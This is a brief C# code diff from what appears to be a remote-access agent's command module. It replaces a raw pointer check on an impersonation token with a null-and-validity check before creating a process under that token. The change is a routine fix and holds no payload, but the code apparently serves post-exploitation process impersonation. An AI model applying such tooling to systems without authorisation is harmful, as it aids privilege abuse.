@@ -26,7 +26,7 @@ namespace Agent.Commands
                 CurrentDirectory = Environment.CurrentDirectory
             };
 
-            if (context.Agent.ImpersonationToken != IntPtr.Zero)
+            if (context.Agent.ImpersonationToken != null && !context.Agent.ImpersonationToken.IsInvalid)
                 creationParms.Token = context.Agent.ImpersonationToken;
 
             var procResult = APIWrapper.CreateProcess(creationParms);
